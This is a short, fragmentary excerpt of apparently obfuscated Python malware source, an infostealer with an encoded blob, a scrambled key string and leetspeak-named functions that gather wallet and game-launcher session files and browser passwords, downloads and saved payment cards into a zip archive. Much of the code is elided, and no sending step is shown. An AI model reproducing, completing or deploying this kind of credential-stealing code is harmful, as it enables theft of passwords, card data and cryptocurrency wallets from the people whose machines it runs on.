...
wx2bHBidG0ZUYnUnzhs+T/ewmKiUEoyfAvQ+ZMEcKT6gKZI0Qr6VoiNB0CwPR7evtw+VGCQ6+QySNsZGJOWJUH7SRo589G8kYJM4KYH4brokdTg3p2q6LKc7ZQBUEzcGINOFgBfupwpR3LwA9nBT6aP/Iss1bM4yZoYRoyZBnyvFI+zLq9j4AY0P1rnkOSU15IzfimM/LQHAO41unJkhvw==
"""

v4r_k3y            = "lRTMsrpdhinQMqhQOLAzdiQlYEfpbsrQeKuRrGiGRzcDNMyvwmvECemsfVCKLJYhhDKHefxLbhatwDNMGUBimInWiykJZQZJxfaYKTnkDLdXUrCuBmTOYEAebgAqirELxMTsquWsldFbuewOvIQJFVdWNyVvZ"
...
def D3f_S3ssi0nFil3s(v4r_zip_file):
    ...
    v4r_session_files_choice = ["Wallets", "Game Launchers"]
...
def D3f_Br0w53r5t341(v4r_zip_file):
    ...
    v4r_browser_choice = ["passwords", "downloads", "cards"]
    v4r_browsers = []
